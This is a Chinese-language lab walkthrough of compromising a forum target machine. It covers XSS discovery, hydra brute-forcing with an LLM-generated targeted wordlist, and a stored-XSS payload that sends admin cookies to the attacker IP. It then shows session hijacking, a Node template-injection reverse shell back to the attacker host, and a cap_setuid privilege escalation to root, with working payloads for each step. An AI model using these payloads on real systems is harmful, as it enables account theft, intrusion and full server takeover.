**环境**：靶机 10.10.1.220（渝信内部技术论坛 v2.1），攻击机 Kali 10.10.1.186。

### **<span style="color:#3498db">信息收集</span>**

nmap 扫出 22 和 80，站点是个内部论坛。挨个功能试，搜索框先试试最经典的 payload：

![mm](/assets/img/2025-06-26-09-45-08.png)

```html
<script>alert(1)</script>
```

弹窗了——搜索处存在 **XSS（跨站脚本）**：把输入的内容当成脚本执行：

![mm](/assets/img/2025-06-26-13-58-15.png)

### **<span style="color:#3498db">hydra 爆破进站</span>**

要发帖得先有个账号。把论坛里露出的线索（姓名、部门、入职时间等）丢给大模型生成一份针对性字典，然后用 hydra 对着登录接口爆破——注意后半段是"登录失败的特征串"，hydra 靠它区分成功与失败：

```bash
hydra -L user.txt -P pass.txt 10.10.1.220 http-post-form \
  "/login:username=^USER^&password=^PASS^:用户名或密码错误" -t 10
```

![mm](/assets/img/2025-06-29-09-34-31.png)

爆破出一个普通用户的口令，登录。

### **<span style="color:#3498db">存储型 XSS 偷管理员 Cookie</span>**

普通用户可以发帖。在帖子正文里写一段"取 cookie 发出去"的脚本：

```html
<script>new Image().src='http://10.10.1.186:4444/'+document.cookie</script>
```

![mm](/assets/img/2025-06-29-14-56-18.png)

和搜索框的反射型不同，这是**存储型 XSS**：恶意代码被**存进了服务器**（帖子里），之后**谁访问这个帖子，谁的 cookie 就被发到我们的监听器**。`new Image()` 是常见手法——图片请求不受同源策略限制，浏览器会老老实实去请求这个 URL，把 cookie 拼在路径里带出来。

问题是管理员不会主动看帖子。用"举报"功能钓：举报时把"违规页面 URL"填成**内网地址**（`127.0.0.1`，相当于管理员从服务器本机打开），管理员处理举报一定会点开：

![mm](/assets/img/2025-06-29-15-00-52.png)

**为什么非要用内网地址**：cookie 是按域名下发的。管理员如果从外网域名打开这个页面，浏览器认为"域名对不上"，**不会带上内网域名的 cookie**，偷了个寂寞。只有内网地址打开的请求才带真 cookie。

Kali 开 `nc -lvp 4444` 等，一会就收到管理员浏览器发来的请求，`connect.sid=...` 攥在手里。

### **<span style="color:#3498db">会话劫持进后台</span>**

把偷到的 `connect.sid` 值填进自己浏览器的 cookie（先退出自己的登录，不然自己的会话 cookie 会打架），刷新页面——**已经是系统管理员了**：

![mm](/assets/img/2025-06-29-15-16-55.png)

### **<span style="color:#3498db">后台模板注入拿 shell</span>**

后台有站点模板编辑功能。这是个 Node.js 站点，模板里 `<% %>` 包的代码**会在服务端被渲染执行**，等于直接往服务器上写代码：

```js
<%const n=this.constructor.constructor('return process.mainModule.require')()('net'),
c=this.constructor.constructor('return process.mainModule.require')()('child_process');
let s=n.connect(4444,'10.10.1.186');
let b=c.spawn('/bin/bash');b.stdout.pipe(s);b.stderr.pipe(s);s.pipe(b.stdin);%>
```

![mm](/assets/img/2025-06-29-15-21-03.png)

那段 `this.constructor.constructor('return process.mainModule.require')()` 是在模板环境里把 Node 的 `require` 摸回来（正常模板拿不到），再拉起 net/child_process 做反弹 shell：

![mm](/assets/img/2025-06-29-15-24-28.png)

拿到 `forum` 用户的 shell。

### **<span style="color:#3498db">node 的 capability 提权</span>**

翻到 `/usr/local/bin/node-debug` 这个非常规二进制，`getcap` 一看带着 **cap_setuid**——和之前靶机的 cap_setuid 是一个套路：这个"node 解释器"可以随意切 uid。写个脚本让 node 把自己切成 root 再拉 bash：

```js
const { spawn } = require('child_process');
process.setuid(0);
spawn('/bin/bash', [], {stdio: [0,1,2]});
```

```bash
/usr/local/bin/node-debug /tmp/exp.js
```

![mm](/assets/img/2025-06-29-16-16-12.png)

root 到手。
